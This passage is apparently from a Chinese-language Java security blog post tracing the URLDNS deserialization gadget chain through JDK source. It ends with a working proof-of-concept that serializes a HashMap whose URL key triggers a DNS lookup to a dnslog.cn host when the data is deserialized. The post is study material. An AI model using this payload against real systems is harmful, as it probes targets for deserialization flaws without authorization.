+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (useAltHashing) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">        &#125;</span><br><span class="line">        h = hashSeed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="URL-hashCode"><a href="#URL-hashCode" class="headerlink" title="URL.hashCode()"></a>URL.hashCode()</h3><ol>
+<li>这里的k式URL的u而不是handler，可以观察到<code>hashCode==-1</code>的时候会调用<code>handler.hashCode()</code>，下一步进入</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="URLStreamHandler-hashCode"><a href="#URLStreamHandler-hashCode" class="headerlink" title="URLStreamHandler.hashCode()"></a>URLStreamHandler.hashCode()</h3><ol>
+<li>来到了该类了，重点关注第18到25行，进入里面调用的两个函数<code>getHostAddress()</code>和<code>getHost()</code>，–&gt; 在getHostAddress()时就有dns了</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Provides the default hash calculation. May be overidden by handlers for</span></span><br><span class="line"><span class="comment"> * other protocols that have different requirements for hashCode</span></span><br><span class="line"><span class="comment"> * calculation.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> u a URL object</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> an &lt;tt&gt;int&lt;/tt&gt; suitable for hash table indexing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the file part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the port part.</span></span><br><span class="line">    <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the ref part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="URLStreamHandler-getHostAddress"><a href="#URLStreamHandler-getHostAddress" class="headerlink" title="URLStreamHandler.getHostAddress()"></a>URLStreamHandler.getHostAddress()</h3><ol>
+<li>进入到该函数，有<code>InetAddress.getByName(host)</code>，触发了dns查询了</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Dst-InetAddress-getByName-host"><a href="#Dst-InetAddress-getByName-host" class="headerlink" title="Dst: InetAddress.getByName(host)"></a>Dst: InetAddress.getByName(host)</h3><ol>
+<li>结束了，可以在往深处看，也可以不了</li>
+</ol>
+<h2 id="URLDNS深入理解"><a href="#URLDNS深入理解" class="headerlink" title="URLDNS深入理解"></a>URLDNS深入理解</h2><h3 id="Q-为什么需要SilentURLStreamHandler类"><a href="#Q-为什么需要SilentURLStreamHandler类" class="headerlink" title="Q: 为什么需要SilentURLStreamHandler类"></a>Q: 为什么需要SilentURLStreamHandler类</h3><ol>
+<li>这里其实不是必须的，只是在这里是ysoserial一个工具，为保证<strong>在利用时put不会产生dns解析的方法</strong></li>
+<li><em><strong>这里又有一个大问题: <code>SilentURLStreamHandler</code>已经是URL对象的一部分了不会反序列化失败吗？因为目标主机中不会有<code>SilentURLStreamHandler</code></strong></em><ol>
+<li>答案其实是在注释里，<strong>这种项目代码会有注释要利用好</strong></li>
+<li>序列化：<ol>
+<li>在序列化过程中，URL 对象的 handler 字段（即 SilentURLStreamHandler 实例）<strong>是 transient 的</strong>，这意味着它不会被序列化到输出流中。</li>
+<li>因此，序列化后的字节流中不会包含 SilentURLStreamHandler 的实例。</li>
+</ol>
+</li>
+<li>反序列化：<ol>
+<li>在反序列化过程中，URL 对象会被重建，但 handler 字段会保持为 null，因为它是 transient 的。</li>
+<li>这意味着在反序列化后，URL 对象将使用默认的 URLStreamHandler。</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h3 id="Q-为什么需要反射设置hashCode-1"><a href="#Q-为什么需要反射设置hashCode-1" class="headerlink" title="Q: 为什么需要反射设置hashCode&#x3D;-1"></a>Q: 为什么需要反射设置hashCode&#x3D;-1</h3><ol>
+<li><p>一开始是由于<code>HashMap.readObject</code>开始的，所以先要将url对象放到HashMap对象中</p>
+</li>
+<li><p>注意到在<code>HashMap.put()</code>方法也会对<code>int hash = hash(key)</code>，所以这里其实就会进行一次dns查询</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这里的hashCode()进入后会发现，hashCode已经被设置，在反序列化时来到这里是没有办法调用<code>handler.hashCode()</code>的了</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>解决办法一</strong>: put之后设置hashCode为-1，可以使用反射来实现</p>
+</li>
+</ol>
+<h3 id="URLDNS-poc"><a href="#URLDNS-poc" class="headerlink" title="URLDNS poc"></a>URLDNS poc</h3><blockquote>
+<p>还是得自己写个poc出来，会看调用链不代表会利用</p>
+</blockquote>
+<ol>
+<li>顺便讲讲<em><strong>作用</strong></em><ol>
+<li>因为其参数不是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</li>
+<li>使⽤Java内置的类构造，对第三⽅库没有依赖</li>
+<li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞，<strong>常用于漏洞探测带外这样</strong></li>
+</ol>
+</li>
+<li>poc写要求<ol>
+<li>要求1: 这里使用的URL在hash的情况下调用dns，需要将URL的hashCode设置为-1 –&gt; <strong>使得在hashMap中的u的hashCode&#x3D;-1</strong></li>
+<li>要求2: 这里的handler需要调用到URLStreamHandler的hash()方法，设置的防止初始化时发送dns对这里没有关系</li>
+<li><strong>在本地调用的特殊</strong><ol>
+<li>法一：由于进行了 DNS 解析，本地存在了解析记录，那么第二次解析就不会去请求 DNS 服务器，所以要刷新dns缓存<code>ipconfig/flushdns</code></li>
+<li>法二：这里也可以使用SilentURLStream这种方法来避免本地的第一次dns解析</li>
+<li>法三：这里可以使<strong>反射先设置1234(非-1)</strong></li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个成功的poc</span></span><br><span class="line"><span class="keyword">package</span> URLDNS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">HashMap</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://3uvif5.dnslog.cn&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射获取类hashCode</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> u.getClass();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 先设置为非-1防止先调用dns</span></span><br><span class="line">            field.set(u,<span class="number">12354</span>);</span><br><span class="line">            payload.put(u,<span class="string">&quot;my payload&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 放入后设置为-1使得反序列化时可以调用dns</span></span><br><span class="line">            field.set(u,-<span class="number">1</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 模拟序列化</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;urldns.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(payload);</span><br><span class="line">            <span class="comment">// 模拟反序列化</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;urldns.bin&quot;</span>));</span><br><span class="line">            ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol>
+<li>URLDNS<ol>
+<li>java安全漫谈，可以初步了解一下原理</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DURLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0.md">强推很细</a></li>
+<li><a target="_blank" rel="noopener" href="https://s31k31.github.io/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/">blog中比较完整的调试过程</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9116">有对Slient这个类做剖析，也有poc</a></li>
+<li><a target="_blank" rel="noopener" href="https://nlrvana.github.io/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/">大佬博客，有poc，但是对Slient那个类的理解不深</a></li>
+</ol>
+</li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E5%8B%92%E4%B8%AA%E5%89%8D%E5%AF%BC%E9%85%8D%E7%BD%AE%E5%B7%A5%E4%BD%9C%E5%95%8A"><span class="toc-number">1.</span> <span class="toc-text">我勒个前导配置工作啊</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8Bflow"><span class="toc-number">1.1.</span> <span class="toc-text">总结一下flow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%9F%E7%AE%97%E5%AD%A6%E5%88%B0%E4%BA%86%E7%BB%8F%E9%AA%8C"><span class="toc-number">1.2.</span> <span class="toc-text">也算学到了经验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%84%9F%E8%B0%A2jar%E5%8C%85%E6%95%91%E6%88%91"><span class="toc-number">1.3.</span> <span class="toc-text">*感谢jar包救我</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS%E5%8A%A8%E6%89%8B%E8%B0%83%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">URLDNS动手调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chains"><span class="toc-number">2.1.</span> <span class="toc-text">Gadget Chains</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLDNS-java"><span class="toc-number">2.2.</span> <span class="toc-text">URLDNS.java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap-readObject"><span class="toc-number">2.3.</span> <span class="toc-text">HashMap.readObject()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap-hash"><span class="toc-number">2.4.</span> <span class="toc-text">HashMap.hash()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-hashCode"><span class="toc-number">2.5.</span> <span class="toc-text">URL.hashCode()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLStreamHandler-hashCode"><span class="toc-number">2.6.</span> <span class="toc-text">URLStreamHandler.hashCode()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLStreamHandler-getHostAddress"><span class="toc-number">2.7.</span> <span class="toc-text">URLStreamHandler.getHostAddress()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dst-InetAddress-getByName-host"><span class="toc-number">2.8.</span> <span class="toc-text">Dst: InetAddress.getByName(host)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">URLDNS深入理解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Q-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81SilentURLStreamHandler%E7%B1%BB"><span class="toc-number">3.1.</span> <span class="toc-text">Q: 为什么需要SilentURLStreamHandler类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%8F%8D%E5%B0%84%E8%AE%BE%E7%BD%AEhashCode-1"><span class="toc-number">3.2.</span> <span class="toc-text">Q: 为什么需要反射设置hashCode&#x3D;-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLDNS-poc"><span class="toc-number">3.3.</span> <span class="toc-text">URLDNS poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">4.</span> <span class="toc-text">Ref</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&text=Java安全5(2)_URLDNS链入门"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&title=Java安全5(2)_URLDNS链入门"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&is_video=false&description=Java安全5(2)_URLDNS链入门"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java安全5(2)_URLDNS链入门&body=Check out this article: https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&title=Java安全5(2)_URLDNS链入门"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&title=Java安全5(2)_URLDNS链入门"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&title=Java安全5(2)_URLDNS链入门"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&title=Java安全5(2)_URLDNS链入门"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&name=Java安全5(2)_URLDNS链入门&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&t=Java安全5(2)_URLDNS链入门"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
